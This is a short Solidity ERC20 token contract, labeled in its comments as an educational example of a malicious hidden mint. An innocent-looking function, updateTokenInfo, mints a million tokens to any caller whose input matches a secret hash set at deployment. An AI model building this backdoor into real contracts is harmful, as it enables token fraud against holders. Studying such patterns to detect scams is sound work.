// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.10;

import "OpenZeppelin/openzeppelin-contracts@4.4.0/contracts/token/ERC20/ERC20.sol";

/**
 * @title Hidden_Mint_Advanced
 * @dev This contract demonstrates a more sophisticated hidden mint function in a malicious ERC20 token.
 * IMPORTANT: This is an educational example and should not be used in production.
 */
contract Hidden_Mint_Advanced is ERC20 {
    bytes32 private _hiddenOwnerHash;

    constructor(
        string memory name_,
        string memory symbol_,
        bytes32 hiddenOwnerHash_
    ) ERC20(name_, symbol_) {
        _hiddenOwnerHash = hiddenOwnerHash_;
    }

    // A seemingly harmless function that accepts a "password" argument
    function updateTokenInfo(string memory newPassword_) external {
        // The malicious actor sets the keccak256 hash of the "password" during contract deployment
        if (keccak256(abi.encodePacked(newPassword_)) == _hiddenOwnerHash) {
            _mint(msg.sender, 1000000 * (10 ** decimals()));
        }
    }
}
